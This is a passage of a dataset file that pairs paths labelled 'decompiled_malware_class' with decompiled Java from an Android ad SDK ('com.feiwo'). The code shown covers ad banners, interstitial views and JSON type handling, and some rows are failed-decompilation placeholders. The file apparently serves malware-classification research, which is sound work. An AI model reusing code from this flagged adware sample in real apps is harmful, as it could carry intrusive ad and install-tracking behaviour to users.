null) {         AdInfo adInfo=appInfo.getAdInfo();         e.a(context,i,adInfo,Integer.valueOf(adInfo.getAdId().intValue()),7,replace3);         appInfo.setInstall(true);         e.a(context,appInfo);       }     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.reflect\packageinfo.code","interface packageinfo { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.reflect\TypeToken.code","public class TypeToken<T> {   final int hashCode;   final Class<? super T> rawType;   final Type type;   public TypeToken(){     this.type=getSuperclassTypeParameter(getClass());     this.rawType=(Class<? super T>)C$Gson$Types.getRawType(this.type);     this.hashCode=this.type.hashCode();   }   TypeToken(  Type type){     this.type=C$Gson$Types.canonicalize((Type)C$Gson$Preconditions.checkNotNull(type));     this.rawType=(Class<? super T>)C$Gson$Types.getRawType(this.type);     this.hashCode=this.type.hashCode();   }   private static AssertionError buildUnexpectedTypeError(  Type type,  Class<?>... clsArr){     StringBuilder sb=new StringBuilder(""Unexpected type. Expected one of: "");     for (    Class<?> cls : clsArr) {       sb.append(cls.getName()).append("", "");     }     sb.append(""but got: "").append(type.getClass().getName()).append("", for type token: "").append(type.toString()).append('.');     return new AssertionError(sb.toString());   }   public static <T>TypeToken<T> get(  Class<T> cls){     return new TypeToken<>(cls);   }   public static TypeToken<?> get(  Type type){     return new TypeToken<>(type);   }   static Type getSuperclassTypeParameter(  Class<?> cls){     Type genericSuperclass=cls.getGenericSuperclass();     if (genericSuperclass instanceof Class) {       throw new RuntimeException(""Missing type parameter."");     }     return C$Gson$Types.canonicalize(((ParameterizedType)genericSuperclass).getActualTypeArguments()[0]);   }   private static boolean isAssignableFrom(  Type type,  GenericArrayType genericArrayType){     Type genericComponentType=genericArrayType.getGenericComponentType();     if (!(genericComponentType instanceof ParameterizedType)) {       return true;     }     if (type instanceof GenericArrayType) {       type=((GenericArrayType)type).getGenericComponentType();     }  else     if (type instanceof Class) {       type=(Class)type;       while (type.isArray()) {         type=type.getComponentType();       }     }     return isAssignableFrom(type,(ParameterizedType)genericComponentType,new HashMap());   }   private static boolean isAssignableFrom(  Type type,  ParameterizedType parameterizedType,  Map<String,Type> map){     if (type == null) {       return false;     }     if (parameterizedType.equals(type)) {       return true;     }     Class<?> rawType=C$Gson$Types.getRawType(type);     ParameterizedType parameterizedType2=type instanceof ParameterizedType ? (ParameterizedType)type : null;     if (parameterizedType2 != null) {       Type[] actualTypeArguments=parameterizedType2.getActualTypeArguments();       TypeVariable<Class<?>>[] typeParameters=rawType.getTypeParameters();       for (int i=0; i < actualTypeArguments.length; i++) {         Type type2=actualTypeArguments[i];         TypeVariable<Class<?>> typeVariable=typeParameters[i];         while (type2 instanceof TypeVariable) {           type2=map.get(((TypeVariable)type2).getName());         }         map.put(typeVariable.getName(),type2);       }       if (typeEquals(parameterizedType2,parameterizedType,map)) {         return true;       }     }     for (    Type type3 : rawType.getGenericInterfaces()) {       if (isAssignableFrom(type3,parameterizedType,new HashMap(map))) {         return true;       }     }     return isAssignableFrom(rawType.getGenericSuperclass(),parameterizedType,new HashMap(map));   }   private static boolean matches(  Type type,  Type type2,  Map<String,Type> map){     return type2.equals(type) || ((type instanceof TypeVariable) && type2.equals(map.get(((TypeVariable)type).getName())));   }   private static boolean typeEquals(  ParameterizedType parameterizedType,  ParameterizedType parameterizedType2,  Map<String,Type> map){     if (!parameterizedType.getRawType().equals(parameterizedType2.getRawType())) {       return false;     }     Type[] actualTypeArguments=parameterizedType.getActualTypeArguments();     Type[] actualTypeArguments2=parameterizedType2.getActualTypeArguments();     for (int i=0; i < actualTypeArguments.length; i++) {       if (!matches(actualTypeArguments[i],actualTypeArguments2[i],map)) {         return false;       }     }     return true;   }   public final boolean equals(  Object obj){     return (obj instanceof TypeToken) && C$Gson$Types.equals(this.type,((TypeToken)obj).type);   }   public final Class<? super T> getRawType(){     return this.rawType;   }   public final Type getType(){     return this.type;   }   public final int hashCode(){     return this.hashCode;   }   @Deprecated public boolean isAssignableFrom(  TypeToken<?> typeToken){     return isAssignableFrom(typeToken.getType());   }   @Deprecated public boolean isAssignableFrom(  Class<?> cls){     return isAssignableFrom((Type)cls);   }   @Deprecated public boolean isAssignableFrom(  Type type){     if (type == null) {       return false;     }     if (this.type.equals(type)) {       return true;     }     if (this.type instanceof Class) {       return this.rawType.isAssignableFrom(C$Gson$Types.getRawType(type));     }     if (this.type instanceof ParameterizedType) {       return isAssignableFrom(type,(ParameterizedType)this.type,new HashMap());     }     if (this.type instanceof GenericArrayType) {       return this.rawType.isAssignableFrom(C$Gson$Types.getRawType(type)) && isAssignableFrom(type,(GenericArrayType)this.type);     }     throw buildUnexpectedTypeError(this.type,Class.class,ParameterizedType.class,GenericArrayType.class);   }   public final String toString(){     return C$Gson$Types.typeToString(this.type);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.stream\JsonReader.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4b7c701f"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.stream\JsonScope.code","final class JsonScope {   static final int CLOSED=8;   static final int DANGLING_NAME=4;   static final int EMPTY_ARRAY=1;   static final int EMPTY_DOCUMENT=6;   static final int EMPTY_OBJECT=3;   static final int NONEMPTY_ARRAY=2;   static final int NONEMPTY_DOCUMENT=7;   static final int NONEMPTY_OBJECT=5;   JsonScope(){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.stream\JsonWriter.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4e19f4c5"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.stream\MalformedJsonException.code","public final class MalformedJsonException extends IOException {   private static final long serialVersionUID=1;   public MalformedJsonException(  String str){     super(str);   }   public MalformedJsonException(  String str,  Throwable th){     super(str);     initCause(th);   }   public MalformedJsonException(  Throwable th){     initCause(th);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\a.code","class a extends TypeToken<List<BannerAdInfo>> {   final BannerBusinssDirector f224a;   public a(  BannerBusinssDirector bannerBusinssDirector){     this.f224a=bannerBusinssDirector;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\aa.code","public class aa implements View.OnClickListener {   final InterstitialView f225a;   public aa(  InterstitialView interstitialView){     this.f225a=interstitialView;   }   @Override public void onClick(  View view){     InterstitialBusinssDirector interstitialBusinssDirector;     TableplaqueAdInfo i;     interstitialBusinssDirector=this.f225a.j;     i=this.f225a.i();     interstitialBusinssDirector.b(i);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\ab.code","class ab implements View.OnClickListener {   final InterstitialView f226a;   public ab(  InterstitialView interstitialView){     this.f226a=interstitialView;   }   @Override public void onClick(  View view){     FwInterstitialManager.close();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\ac.code","public class ac implements View.OnClickListener {   final InterstitialView f227a;   public ac(  InterstitialView interstitialView){     this.f227a=interstitialView;   }   @Override public void onClick(  View view){     this.f227a.a(false);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\ad.code","public class ad implements com.feiwo.view.a.b {   final InterstitialView f228a;   public ad(  InterstitialView interstitialView){     this.f228a=interstitialView;   }   @Override public void a(  com.feiwo.f.a.h hVar){     com.feiwo.b.a.f fVar;     InterstitialBusinssDirector interstitialBusinssDirector;     if (!hVar.c) {       this.f228a.g=0;     }     InterstitialView interstitialView=this.f228a;     fVar=this.f228a.k;     String str=com.feiwo.c.a.u + 1;     interstitialBusinssDirector=this.f228a.j;     interstitialView.t=(List)fVar.a(str,com.feiwo.c.b(interstitialBusinssDirector.o()));   }   @Override public void a(  com.feiwo.f.a.h hVar,  TableplaqueAdInfo tableplaqueAdInfo,  Drawable drawable){     ViewFlipper viewFlipper;     InterstitialBusinssDirector interstitialBusinssDirector;     InterstitialBusinssDirector interstitialBusinssDirector2;     ViewFlipper viewFlipper2;     viewFlipper=this.f228a.i;     if (viewFlipper != null) {       if (this.f228a.a() != null) {         this.f228a.a().a(false);       }       if (!hVar.c) {         viewFlipper2=this.f228a.i;         viewFlipper2.removeAllViews();       }       if (drawable != null) {         this.f228a.a(tableplaqueAdInfo,drawable);         return;       }       InterstitialView.e(this.f228a);       this.f228a.h();       interstitialBusinssDirector=this.f228a.j;       interstitialBusinssDirector.a(tableplaqueAdInfo.getAdId().intValue(),1);       InterstitialView interstitialView=this.f228a;       interstitialBusinssDirector2=this.f228a.j;       interstitialView.a(interstitialBusinssDirector2.e(1));     }   }   @Override public void a(  TableplaqueAdInfo tableplaqueAdInfo){     InterstitialBusinssDirector interstitialBusinssDirector;     InterstitialView interstitialView=this.f228a;     interstitialBusinssDirector=this.f228a.j;     interstitialView.a(interstitialBusinssDirector.e(1));   }   @Override public void b(  com.feiwo.f.a.h hVar){     FwInterstitialManager.close();     if (this.f228a.a() != null) {       this.f228a.a().a(true);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\ae.code","public interface ae {   void a(  boolean z); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\af.code","public class af {   private final int f229a=500;   private InterstitialView f230b;   private FrameLayout c;   public View a(){     return this.c;   }   public void a(  Context context,  int i,  int i2){     this.c=new FrameLayout(context);     FrameLayout.LayoutParams layoutParams=new FrameLayout.LayoutParams(-1,-1);     this.c.setLayoutParams(layoutParams);     layoutParams.gravity=17;     this.f230b=new InterstitialView(context,this.c);     this.c.addView(this.f230b);     ScaleAnimation scaleAnimation=new ScaleAnimation(0.0f,1.0f,0.0f,1.0f);     scaleAnimation.setFillAfter(true);     scaleAnimation.setDuration(500L);     this.f230b.startAnimation(scaleAnimation);   }   public View b(){     return this.f230b;   }   public void c(){     if (this.f230b != null) {       this.f230b.c();     }   }   public void d(){     if (this.f230b != null) {       this.f230b.b();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\ag.code","public class ag extends Handler {   final LV f231a;   public ag(  LV lv){     this.f231a=lv;   }   @Override public void handleMessage(  Message message){     aj ajVar;     aj ajVar2;     TextView textView;     TextView textView2;     TextView textView3;     TextView textView4;     TextView textView5;     TextView textView6;     TextView textView7;     TextView textView8;     TextView textView9;     TextView textView10;     TextView textView11;     TextView textView12;     TextView textView13;     TextView textView14;     int i;     TextView textView15;     TextView textView16;     TextView textView17;     TextView textView18;     TextView textView19;     TextView textView20;     TextView textView21;     TextView textView22;     TextView textView23;     TextView textView24;     TextView textView25;     TextView textView26;     TextView textView27;     TextView textView28;     TextView textView29;     TextView textView30;     TextView textView31;     TextView textView32;     if (message.what != 123) {       if (message.what == 234) {         textView9=this.f231a.k;         if (textView9 != null) {           textView14=this.f231a.k;           textView14.setVisibility(0);         }         textView10=this.f231a.l;         if (textView10 != null) {           textView13=this.f231a.l;           textView13.setVisibility(0);         }         textView11=this.f231a.m;         if (textView11 != null) {           textView12=this.f231a.m;           textView12.setVisibility(0);           return;         }         return;       }       if (message.what != 345) {         if (message.what != 444) {           if (message.what == 666 || message.what == 555) {           }           return;         }         ajVar=this.f231a.f216a;         if (ajVar != null) {           ajVar2=this.f231a.f216a;           ajVar2.a();           return;         }         return;       }       textView=this.f231a.k;       if (textView != null) {         textView8=this.f231a.k;         textView8.setVisibility(8);       }       textView2=this.f231a.l;       if (textView2 != null) {         textView7=this.f231a.l;         textView7.setVisibility(8);       }       textView3=this.f231a.m;       if (textView3 != null) {         textView6=this.f231a.m;         textView6.setVisibility(8);       }       textView4=this.f231a.j;       if (textView4 != null) {         textView5=this.f231a.j;         textView5.setText(com.feiwo.i.c.a.aY);         return;       }       return;     }     i=this.f231a.n; switch (i % 3) { case 0:       textView27=this.f231a.k;     if (textView27 != null) {       textView32=this.f231a.k;       textView32.setBackgroundColor(SupportMenu.CATEGORY_MASK);     }   textView28=this.f231a.l; if (textView28 != null) {   textView31=this.f231a.l;   textView31.setBackgroundColor(Color.rgb(174,165,154)); } textView29=this.f231a.m; if (textView29 != null) { textView30=this.f231a.m; textView30.setBackgroundColor(Color.rgb(174,165,154)); break; } break; case 1: textView21=this.f231a.k; if (textView21 != null) { textView26=this.f231a.k; textView26.setBackgroundColor(Color.rgb(174,165,154)); } textView22=this.f231a.l; if (textView22 != null) { textView25=this.f231a.l; textView25.setBackgroundColor(SupportMenu.CATEGORY_MASK); } textView23=this.f231a.m; if (textView23 != null) { textView24=this.f231a.m; textView24.setBackgroundColor(Color.rgb(174,165,154)); break; } break; case 2: textView15=this.f231a.k; if (textView15 != null) { textView20=this.f231a.k; textView20.setBackgroundColor(Color.rgb(174,165,154)); } textView16=this.f231a.l; if (textView16 != null) { textView19=this.f231a.l; textView19.setBackgroundColor(Color.rgb(174,165,154)); } textView17=this.f231a.m; if (textView17 != null) { textView18=this.f231a.m; textView18.setBackgroundColor(SupportMenu.CATEGORY_MASK); break; } break; } LV.e(this.f231a); } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\ah.code","public class ah implements View.OnClickListener {   final LV f232a;   public ah(  LV lv){     this.f232a=lv;   }   @Override public void onClick(  View view){     int i;     aj ajVar;     aj ajVar2;     i=this.f232a.f217b;     if (i != 1) {       ajVar=this.f232a.f216a;       if (ajVar != null) {         ajVar2=this.f232a.f216a;         ajVar2.a();       }       this.f232a.f217b=1;       this.f232a.g();       this.f232a.e();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\ai.code","public class ai extends TimerTask {   final LV f233a;   public ai(  LV lv){     this.f233a=lv;   }   @Override public void run(){     Handler handler;     Handler handler2;     handler=this.f233a.w;     Message obtainMessage=handler.obtainMessage();     obtainMessage.what=123;     handler2=this.f233a.w;     handler2.sendMessage(obtainMessage);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\aj.code","public interface aj {   void a(); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\ak.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3688b685"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\al.code","public class al extends TimerTask {   final RlodingView f235a;   public al(  RlodingView rlodingView){     this.f235a=rlodingView;   }   @Override public void run(){     Handler handler;     Handler handler2;     handler=this.f235a.h;     Message obtainMessage=handler.obtainMessage(1118224,Integer.valueOf(RlodingView.c(this.f235a) % 4));     handler2=this.f235a.h;     handler2.sendMessage(obtainMessage);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\am.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6f33d0ba"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\b.code","class b extends TypeToken<RootNode<BannerAdInfo>> {   final BannerBusinssDirector f237a;   public b(  BannerBusinssDirector bannerBusinssDirector){     this.f237a=bannerBusinssDirector;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\BannerBusinssDirector.code","public class BannerBusinssDirector extends com.feiwo.d.e<BannerAdInfo> {   private final String f=BannerBusinssDirector.class.getSimpleName();   private BaseBannerView g;   public static synchronized BannerBusinssDirector x(){     BannerBusinssDirector bannerBusinssDirector; synchronized (BannerBusinssDirector.class) {       bannerBusinssDirector=(BannerBusinssDirector)a(2);       if (bannerBusinssDirector == null) {         bannerBusinssDirector=new BannerBusinssDirector();         a(2,(com.feiwo.d.e<?>)bannerBusinssDirector);       }     }     return bannerBusinssDirector;   }   @Override public int a(){     return 2;   }   public void a(  ViewGroup viewGroup){     this.g=new BaseBannerView(n().getApplicationContext(),viewGroup);     viewGroup.removeAllViews();     viewGroup.addView(this.g);     a(true);   }   @Override public Type b(){     return new a(this).getType();   }   @Override public TypeToken<RootNode<BannerAdInfo>> c(){     return new b(this);   }   @Override public int i(){     if (this.g != null) {       this.g.a();     }     return super.i();   }   @Override public int init(  Context context,  String str){     return super.init(context,str);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\BaseBannerView.code","!org.eclipse.jdt.core.dom.TypeDeclaration@234df01a"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\c.code","public class c implements com.feiwo.f.a.g {   final BaseBannerView f238a;   public c(  BaseBannerView baseBannerView){     this.f238a=baseBannerView;   }   @Override public void a(  com.feiwo.f.a.h hVar,  RootNode<?> rootNode,  RootNode<?> rootNode2){     BannerBusinssDirector bannerBusinssDirector;     BannerBusinssDirector bannerBusinssDirector2;     BannerBusinssDirector bannerBusinssDirector3;     BannerBusinssDirector bannerBusinssDirector4;     BannerBusinssDirector bannerBusinssDirector5;     if (this.f238a.getContext() == null) {       return;     }     if (!hVar.c) {       this.f238a.g=0;     }     bannerBusinssDirector=this.f238a.e;     if (bannerBusinssDirector.a(rootNode2)) {       return;     }     BaseBannerView baseBannerView=this.f238a;     bannerBusinssDirector2=this.f238a.e;     com.feiwo.b.a.f fVar=bannerBusinssDirector2.c;     bannerBusinssDirector3=this.f238a.e;     baseBannerView.h=com.feiwo.d.a.a(fVar,bannerBusinssDirector3.o());     BannerAdInfo bannerAdInfo=(BannerAdInfo)rootNode2.getAd().getAdList().get(0);     if (TextUtils.isEmpty(bannerAdInfo.getBannerImg())) {       bannerBusinssDirector5=this.f238a.e;       bannerBusinssDirector5.c(bannerAdInfo.getAdId().intValue());       this.f238a.c();     }  else {       ScreenSize d=com.feiwo.i.t.d(this.f238a.getContext());       String str=com.feiwo.i.b.e.a(d.getScreenWidth() + ""*"" + d.getScreenHeight(),bannerAdInfo.getBannerImg())[1];       bannerBusinssDirector4=this.f238a.e;       com.feiwo.i.b.a.a().a(this.f238a.getContext(),bannerBusinssDirector4.w(),com.feiwo.i.c.b.a(str),new d(this,bannerAdInfo));     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\d.code","class d implements com.feiwo.i.b.d {   final BannerAdInfo f239a;   final c f240b;   public d(  c cVar,  BannerAdInfo bannerAdInfo){     this.f240b=cVar;     this.f239a=bannerAdInfo;   }   @Override public void a(  Drawable drawable,  String str){     RelativeLayout relativeLayout;     if (this.f240b.f238a.getContext() != null) {       relativeLayout=this.f240b.f238a.c;       if (relativeLayout == null) {         return;       }       this.f240b.f238a.a(this.f239a,drawable);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\DMCustomView.code","public class DMCustomView extends RelativeLayout {   private final String f208a;   private Button f209b;   public DMCustomView(  Context context){     super(context);     this.f208a=DMCustomView.class.getSimpleName();     this.f209b=new Button(getContext());   }   private void b(  String str,  String str2){     Bitmap b2=com.feiwo.i.b.f.b(getContext().getApplicationContext(),str);     this.f209b.setLayoutParams(new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(getContext().getApplicationContext(),b2.getWidth()),com.feiwo.i.b.e.a(getContext().getApplicationContext(),b2.getHeight())));   }   public void a(  String str,  String str2){     b(str,str2);   }   @Override public void setId(  int i){     this.f209b.setId(i);   }   public void setImages(  String str,  String str2){     this.f209b.setBackgroundDrawable(com.feiwo.i.b.g.a(getContext(),str,str2,null,null));     removeAllViews();     addView(this.f209b);     a(str,str2);   }   @Override public void setOnClickListener(  View.OnClickListener onClickListener){     this.f209b.setOnClickListener(onClickListener);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\e.code","public class e implements Runnable {   final BaseBannerView f241a;   public e(  BaseBannerView baseBannerView){     this.f241a=baseBannerView;   }   @Override public void run(){     this.f241a.c();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\f.code","public abstract class f {   public View.OnClickListener f242a;   public void a(  View.OnClickListener onClickListener){     this.f242a=onClickListener;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\FwBannerManager.code","public class FwBannerManager {   private static BannerBusinssDirector a(){     return BannerBusinssDirector.x();   }   public static int destory(){     return a().i();   }   public static int init(  Context context,  String str){     return a().init(context,str);   }   public static int init(  Context context,  String str,  ViewGroup viewGroup){     int init=init(context,str);     setParentView(viewGroup);     return init;   }   public static void setParentView(  ViewGroup viewGroup){     a().a(viewGroup);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\FwInterstitialManager.code","public class FwInterstitialManager {   private static InterstitialBusinssDirector a(){     return InterstitialBusinssDirector.x();   }   public static int close(){     return a().A();   }   public static int init(  Context context,  String str){     return a().init(context,str);   }   public static boolean isReady(){     return a().j();   }   public static void showFullScreenInterstitial(){     a().z();   }   public static void showInterstitial(){     a().y();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\g.code","public class g extends f {   private Context f243b;   private TextView c;   private TextView d;   private Button e;   private RotateAnimation f;   public g(  Context context){     this.f243b=context;   }   public View a(){     RelativeLayout relativeLayout=new RelativeLayout(this.f243b);     this.c=new TextView(this.f243b);     this.c.setId(124);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.addRule(14);     layoutParams.setMargins(0,com.feiwo.i.b.e.a(this.f243b,60.0f),0,0);     this.c.setText(com.feiwo.i.c.a.z + ""\n"" + com.feiwo.i.c.a.A);     this.c.setTextSize(24.0f);     this.c.setGravity(17);     this.c.setTextColor(Color.rgb(93,79,61));     this.d=new TextView(this.f243b);     this.d.setId(1234);     this.d.setBackgroundDrawable(com.feiwo.i.b.g.a(this.f243b,com.feiwo.i.c.a.aE,com.feiwo.i.c.a.aF,null,null));     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(this.f243b,213.0f),com.feiwo.i.b.e.a(this.f243b,40.0f));     layoutParams2.addRule(14);     layoutParams2.addRule(15);     this.d.setText(com.feiwo.i.c.a.B);     this.d.setGravity(17);     this.d.setTextSize(18.0f);     this.d.setTextColor(-1);     this.d.setSingleLine();     this.d.setOnClickListener(new h(this));     this.e=new Button(this.f243b);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(80,80);     layoutParams3.addRule(14);     layoutParams3.setMargins(0,100,0,0);     this.e.setBackgroundDrawable(com.feiwo.i.b.f.a(this.f243b,com.feiwo.i.c.a.aH));     this.f=new RotateAnimation(0.0f,3600.0f,1,0.5f,1,0.5f);     this.f.setDuration(5000L);     this.f.setRepeatCount(-1);     relativeLayout.addView(this.c,layoutParams);     relativeLayout.addView(this.d,layoutParams2);     relativeLayout.addView(this.e,layoutParams3);     return relativeLayout;   }   public void a(  int i){     this.d.setVisibility(i);   }   public void a(  String str){     this.c.setText(str);   }   public void b(){     this.c.setVisibility(8);     this.d.setVisibility(8);     this.e.setVisibility(0);     this.e.startAnimation(this.f);   }   public void c(){     this.e.clearAnimation();     this.e.setVisibility(8);     this.c.setVisibility(0);     this.d.setVisibility(0);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\GifImageView.code","public class GifImageView extends ImageView {   private Movie f210a;   private long f211b;   public GifImageView(  Context context){     super(context);   }   @Override public void onDraw(  Canvas canvas){     long uptimeMillis=SystemClock.uptimeMillis();     if (this.f211b == 0) {       this.f211b=uptimeMillis;     }     if (this.f210a != null) {       int duration=this.f210a.duration();       if (duration == 0) {         duration=b.a.a.f.f12b;       }       this.f210a.setTime((int)((uptimeMillis - this.f211b) % duration));       this.f210a.draw(canvas,0.0f,0.0f);       invalidate();     }   }   public void setGifPath(  String str){     this.f210a=Movie.decodeFile(str);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\h.code","class h implements View.OnClickListener {   final g f244a;   public h(  g gVar){     this.f244a=gVar;   }   @Override public void onClick(  View view){     if (this.f244a.f242a != null) {       this.f244a.f242a.onClick(view);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\i.code","public class i implements View.OnClickListener {   private RelativeLayout f246b;   private ImageView c;   private DMCustomView d;   private Context e;   private InterstitialBusinssDirector f;   private com.feiwo.view.a.a g;   private TableplaqueAdInfo h;   private final String f245a=i.class.getSimpleName();   private Handler i=new Handler();   private Runnable j=new l(this);   public void a(  Drawable drawable){     this.c.setLayoutParams(new RelativeLayout.LayoutParams(-1,-1));     this.f246b.setLayoutParams(new FrameLayout.LayoutParams(-1,-1));     this.c.setScaleType(ImageView.ScaleType.FIT_XY);     if (this.e.getResources().getConfiguration().orientation == 2) {       drawable=com.feiwo.i.b.e.a(drawable,90.0f);     }     this.c.setImageDrawable(drawable);     this.c.startAnimation(com.feiwo.i.b.f());   }   public void d(){     if (e()) {       return;     }     this.d=new DMCustomView(this.e);     this.d.setImages(com.feiwo.i.c.a.bi,com.feiwo.i.c.a.bj);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.addRule(12);     layoutParams.addRule(14);     layoutParams.bottomMargin=com.feiwo.i.b.e.a(this.e,30.0f);     this.d.setLayoutParams(layoutParams);     this.d.setOnClickListener(new j(this));     this.f246b.addView(this.d);   }   private boolean e(){     return (this.h == null || this.h.getWifiSwitches() == null || !com.feiwo.i.u.a(this.f.n(),this.h).getClickDown().isOn()) ? false : true;   }   private void f(){     this.f.a(2,new k(this));   }   public void g(){     if (c() != null) {       c().a();     }   }   public View a(){     return this.f246b;   }   public void a(  Context context,  int i,  int i2){     this.f=InterstitialBusinssDirector.x();     this.e=context;     this.f246b=new RelativeLayout(context);     this.f246b.setLayoutParams(new ViewGroup.LayoutParams(i,i2));     this.c=new ImageView(context);     this.c.setOnClickListener(this);     this.f246b.addView(this.c);     f();   }   public void a(  com.feiwo.view.a.a aVar){     this.g=aVar;   }   public void b(){     if (this.i != null) {       this.i.removeCallbacks(this.j);     }   }   public com.feiwo.view.a.a c(){     return this.g;   }   @Override public void onClick(  View view){     if (e()) {       InterstitialBusinssDirector.x().b(this.h);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\IA.code","!org.eclipse.jdt.core.dom.TypeDeclaration@325bca56"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\InterstitialBusinssDirector.code","public class InterstitialBusinssDirector extends com.feiwo.d.e<TableplaqueAdInfo> {   static InterstitialBusinssDirector f;   private final String g=InterstitialBusinssDirector.class.getSimpleName();   private Intent h;   public static synchronized InterstitialBusinssDirector x(){     InterstitialBusinssDirector interstitialBusinssDirector; synchronized (InterstitialBusinssDirector.class) {       interstitialBusinssDirector=(InterstitialBusinssDirector)a(3);       if (interstitialBusinssDirector == null) {         interstitialBusinssDirector=new InterstitialBusinssDirector();         a(3,(com.feiwo.d.e<?>)interstitialBusinssDirector);       }     }     return interstitialBusinssDirector;   }   public int A(){     if (n() == null) {       return 0;     }     n().sendBroadcast(new Intent(com.feiwo.c.a.G));     return 0;   }   @Override public int a(){     return 3;   }   public int a(  AdInfo adInfo,  int i){     a(adInfo,(List<AdInfo>)this.c.a(com.feiwo.c.a.u + i,com.feiwo.c.b(o())));     a(adInfo.getAdId().intValue(),((TableplaqueAdInfo)adInfo).getShowStyle().intValue());     a(n(),adInfo,3,(String)null);     a((TableplaqueAdInfo)adInfo);     return 0;   }   public void a(  int i,  int i2){     UserInfo userInfo=e().getUserInfo();     userInfo.lastAdId=i;     